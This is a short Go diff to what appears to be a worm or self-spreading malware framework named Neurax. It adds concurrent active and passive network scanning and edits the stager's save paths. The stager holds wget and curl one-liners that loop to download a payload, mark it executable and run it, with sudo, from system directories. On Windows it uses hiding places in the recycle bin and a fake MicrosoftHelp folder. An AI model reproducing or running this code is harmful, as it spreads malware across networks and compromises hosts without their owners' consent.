@@ -106,6 +106,7 @@ type __N struct {
 	Platform                 string
 	Cidr                     string
 	ScanPassive              bool
+	ScanActive               bool
 	ScanActiveTimeout        int
 	ScanPassiveTimeout       int
 	ScanPassiveIface         string
@@ -158,6 +159,7 @@ var N = __N{
 	Platform:                 runtime.GOOS,
 	Cidr:                     GetLocalIp() + "/24",
 	ScanPassive:              false,
+	ScanActive:               true,
 	ScanActiveTimeout:        2,
 	ScanPassiveTimeout:       50,
 	ScanPassiveIface:         "default",
@@ -226,8 +228,8 @@ func NeuraxStager() string {
 		[]string{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
 		[]string{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
 	}
-	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
-		"/etc/", "/usr/", "/usr/share/"}
+	linux_save_paths := []string{"/tmp", "/lib", "/home",
+		"/etc", "/usr", "/usr/share"}
 	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
 	switch N.Platform {
 	case "windows":
@@ -624,9 +626,10 @@ func neurax_scan_active(f func(string)) {
 
 func neurax_scan_core(f func(string)) {
 	if N.ScanPassive {
-		neurax_scan_passive(f)
-	} else {
-		neurax_scan_active(f)
+		go neurax_scan_passive(f)
+	}
+	if N.ScanActive {
+		go neurax_scan_active(f)
 	}
 }
 
